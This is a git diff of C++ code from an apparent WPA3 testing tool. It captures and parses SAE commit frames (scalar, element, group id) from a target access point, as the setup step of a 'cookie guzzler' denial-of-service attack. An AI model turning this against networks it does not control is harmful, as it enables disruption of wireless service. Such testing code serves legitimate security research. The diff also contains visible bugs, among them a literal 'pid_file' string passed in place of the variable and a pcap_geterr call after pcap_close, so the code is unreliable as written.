@@ -1,3 +1,5 @@
+#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
+
 #include <fstream>
 #include <unistd.h>
 #include <csignal>
@@ -6,55 +8,84 @@
 
 #include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
 #include "logger/log.h"
-
-namespace Tins{
-    class RawPDU;
-    class Dot11Authentication;
-}
+#include "system/hw_capabilities.h"
+#include "pcap/pcap.h"
 
 using namespace std;
 using namespace Tins;
 namespace wpa3_tester::cookie_guzzler{
 
-    SAEPair capture_sae_commit(const string &iface, const HWAddress<6> &ap_mac, const int timeout_sec) {
-        Sniffer sniffer(iface);
-        sniffer.set_filter("wlan type mgt subtype auth and wlan addr2 "+ap_mac.to_string());
+    optional<SAEPair> parse_sae_commit(const uint8_t *packet, const uint32_t len) {
+        if (len < 4) return nullopt;
 
-        SAEPair result;
+        const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet + 2);
 
-        auto callback = [&result](PDU &pdu) {
-            const auto &auth = pdu.rfind_pdu<Dot11Authentication>();
+        constexpr size_t dot11_header = 24;
+        constexpr size_t auth_fixed   = 6;
+        const size_t auth_offset = radiotap_len + dot11_header;
+        const size_t sae_offset  = auth_offset + auth_fixed;
 
-            if (auth.auth_algorithm() == 3 && auth.auth_seq_number() == 1) {
-                if (pdu.find_pdu<RawPDU>()) {
-                    const auto &payload = pdu.rfind_pdu<RawPDU>().payload();
+        if (len <= sae_offset) return nullopt;
 
-                    if (payload.size() >= (2 + 32 + 64)) {
-                        result.scalar.assign(payload.begin() + 2, payload.begin() + 34);
-                        result.element.assign(payload.begin() + 34, payload.begin() + 98);
-                        result.success = true;
-                        return false;
-                    }
-                }
-            }
-            return true;
-        };
+        const uint16_t algo = *reinterpret_cast<const uint16_t *>(packet + auth_offset);
+        const uint16_t seq  = *reinterpret_cast<const uint16_t *>(packet + auth_offset + 2);
 
+        if (algo != 3 || seq != 1) return nullopt;
 
-        atomic running{true};
-        thread timer([&]() {this_thread::sleep_for(seconds(timeout_sec)); running = false;});
-        sniffer.sniff_loop([&](PDU& pdu) { callback(pdu); return running.load();});
-        timer.join();
+        const uint8_t *sae_data = packet + sae_offset;
+        const size_t   sae_size = len - sae_offset;
 
-        return result;
+        if (sae_size < (2 + 32 + 64)) return nullopt;
+
+        SAEPair frame;
+        frame.group_id = *reinterpret_cast<const uint16_t *>(sae_data);
+        frame.scalar.assign(sae_data + 2,  sae_data + 34);
+        frame.element.assign(sae_data + 34, sae_data + 98);
+        return frame;
     }
 
-    // run_cmd for logging or useless:
-    void start_wpa_supplicant(const string &iface, const string &conf_path, const string &pid_file) {
-        // -B (background) -P <pid file>
-        const string cmd = "wpa_supplicant -B -i "+iface+" -c "+conf_path+" -P "+pid_file;
-        log(LogLevel::INFO, "Run wpa_supplicant to get handshake values...");
-        system(cmd.c_str());
+    SAEPair capture_sae_commit(const string &iface, const HWAddress<6> &ap_mac, const int timeout_sec,  pcap_t *handle) {
+        SAEPair result;
+        char errbuf[PCAP_ERRBUF_SIZE];
+
+        if(handle == nullptr){
+            handle = pcap_open_live(iface.c_str(), 65535, 1, 100, errbuf);
+        }
+        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
+
+        const string filter_str = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
+        bpf_program fp{};
+        if (pcap_compile(handle, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0) {
+            pcap_close(handle);
+            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
+        }
+        pcap_setfilter(handle, &fp);
+        pcap_freecode(&fp);
+
+        const auto deadline = chrono::steady_clock::now() + seconds(timeout_sec);
+
+        while (chrono::steady_clock::now() < deadline) {
+            pcap_pkthdr *header;
+            const uint8_t *packet;
+            const int res = pcap_next_ex(handle, &header, &packet);
+
+            if (res == 0) continue;
+            if (res < 0) break;
+
+            const auto frame = parse_sae_commit(packet, header->caplen);
+            if (!frame) continue;
+
+            log(LogLevel::DEBUG, "SAE payload size: " + to_string(frame->scalar.size()));
+
+            result.group_id = frame->group_id;
+            result.scalar   = frame->scalar;
+            result.element  = frame->element;
+            result.success  = true;
+            break;
+        }
+
+        pcap_close(handle);
+        return result;
     }
 
     void stop_wpa_supplicant(const string &pid_file){
@@ -71,9 +102,27 @@ namespace wpa3_tester::cookie_guzzler{
         }
     }
 
-    std::string create_wpa_supplicant_config(const std::string& ssid) {
-        std::string conf_path = "/tmp/wpa3_guzzler_temp.conf";
-        std::ofstream conf(conf_path);
+    // run_cmd for logging or useless:
+    void start_wpa_supplicant(const string &iface, const string &conf_path, const string &pid_file) {
+
+        if (filesystem::exists(pid_file)) { stop_wpa_supplicant(pid_file);}
+
+        // Clean up stale socket
+        const string socket = "/var/run/wpa_supplicant/" + iface;
+        if (filesystem::exists(socket)) filesystem::remove(socket);
+
+        log(LogLevel::INFO, "Run wpa_supplicant to get handshake values...");
+        hw_capabilities::run_cmd({
+            "wpa_supplicant", "-B",
+            "-i", iface,
+            "-c", conf_path,
+            "-P", pid_file
+        });
+    }
+
+    string create_wpa_supplicant_config(const string& ssid) {
+        string conf_path = "/tmp/wpa3_guzzler_temp"+ssid+".conf";
+        ofstream conf(conf_path);
 
         if (conf.is_open()) {
             conf << "ctrl_interface=/var/run/wpa_supplicant\n";
@@ -81,8 +130,8 @@ namespace wpa3_tester::cookie_guzzler{
             conf << "network={\n";
             conf << "    ssid=\"" << ssid << "\"\n";
             conf << "    key_mgmt=SAE\n";
-            conf << "    sae_password=\"anything123\"\n"; // Heslo je jedno, chceme jen Commit
-            conf << "    ieee80211w=2\n";                // Nutné pro WPA3 (PMF)
+            conf << "    sae_password=\"anything123\"\n"; // password doesnt matter
+            conf << "    ieee80211w=2\n";
             conf << "}\n";
             conf.close();
         }
@@ -91,13 +140,14 @@ namespace wpa3_tester::cookie_guzzler{
     }
 
 
-    SAEPair get_commit_values(const string &sniff_iface, const string &ssid, const HWAddress<6> &ap_mac, const int timeout) {
+    SAEPair get_commit_values(const string &iface, const string &sniff_iface, const string &ssid, const HWAddress<6> &ap_mac, const int timeout, pcap_t *handler) {
+        if(iface == sniff_iface) throw invalid_argument("Interface names do cant be same");
         const string pid_file = "/tmp/wpa_supplicant_get_commit_values.pid";
-        string conf_path = create_wpa_supplicant_config(ssid);
-        start_wpa_supplicant(sniff_iface, filesystem::absolute(conf_path), pid_file);
-        SAEPair sae_params = capture_sae_commit(sniff_iface, ap_mac, timeout);
+        const string conf_path = create_wpa_supplicant_config(ssid);
+        start_wpa_supplicant(iface, filesystem::absolute(conf_path), pid_file);
+        SAEPair sae_params = capture_sae_commit(sniff_iface, ap_mac, timeout, handler);
         stop_wpa_supplicant("pid_file");
-        std::filesystem::remove(conf_path);
+        filesystem::remove(conf_path);
         return sae_params;
     }
 }
